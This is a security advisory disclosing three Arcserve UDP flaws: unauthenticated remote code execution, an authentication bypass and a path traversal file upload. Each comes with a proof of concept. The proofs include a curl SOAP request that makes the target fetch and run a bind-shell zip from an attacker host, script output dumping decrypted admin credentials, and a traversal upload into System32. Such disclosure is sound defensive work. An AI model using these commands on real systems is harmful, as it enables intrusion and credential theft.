# Arcserve Unified Data Protection Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

**CVE-2023-41998****- Arcserve UDP Unauthenticated RCE**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

An unauthenticated, remote attacker can execute code remotely via the downloadAndInstallPatch() routine within “com.ca.arcflash.rps.webservice.RPSService4CPMImpl.” This routine allows users to upload and execute arbitrary files.

For example, when triggering this method, a malicious actor can cause the service to download a zip file from an attacker-controlled URL to <UDP\_INSTALL\_DIR>\Engine\BIN\patch\. The zip file is subsequently decompressed and a decompressed EXE file with the same file name as the zip file (i.e., foo.exe zipped to foo.zip) is then executed.

**Proof of Concept**

```
# On <attacker-host>, create a malicious zip/exe to be hosted and later referenced
# Run a web server to serve the zip file
# The webroot should be the parent directory because the download URL must have at least 4 slashes
/tmp/download# python3 -m http.server -d ../
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# On a separate terminal, run:
curl -ki -H 'Content-Type: text/xml' -d '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/"><S:Body><ns2:downloadAndInstallPatch xmlns:ns2="http://webservice.arcflash.ca.com"><arg0>http://<attacker-host>:8000/download/shell_bind_tcp.zip</arg0></ns2:downloadAndInstallPatch></S:Body></S:Envelope>' 'https://<target-host>:8014/RPSWebServiceImpl/services/RPSService4CPMImpl'

**CVE-2023-41999 - Arcserve UDP Management Authentication Bypass**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

Arcserve UDP management console supports authentication with a UUID (i.e.,ValidateUserByUUID()). An unauthenticated remote attacker can obtain a valid authentication UUID to login to the console.

Once authenticated, the attacker can perform actions that require authentication. For example, the attacker can grab the "Edge Account" (i.e., Administrative) credentials.

**Proof of Concept**

```
python3 arcserve_udp_console_auth_bypass.py <target-host>
[*] Getting hostUuid
        [+] hostUuid: b86e10f6-60d5-4244-82ce-8afe90fc0170
[*] Calling validateUserByUUID
        [+] Login OK
[*] Calling getEdgeAccount
        [+] username: administrator
        [+] domain  : .
        [+] encrypted password: ca942ee002fb24339b5ff64ccdd647b9d131cdd5db10b59ca3b20c796365500d
        [+] decrypted password: Password123
```

**CVE-2023-42000 - Arcserve UDP Agent Unauthenticated Path Traversal File Upload**

(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

A path traversal vulnerability exists in com.ca.arcflash.ui.server.servlet.FileHandlingServlet.doUpload(). An unauthenticated remote attacker can exploit it to upload arbitrary files to any location on the file system where the UDP agent is installed.

**Proof of Concept**

```
echo -n 'malicious content' > /tmp/malicious_file
curl -ki -F 'file=@/tmp/malicious_file;filename=/../../../../../../../../../Windows/System32/malicious_file'  'https://<target-host>:8014/fileHandling?action=upload'
```

### Solution
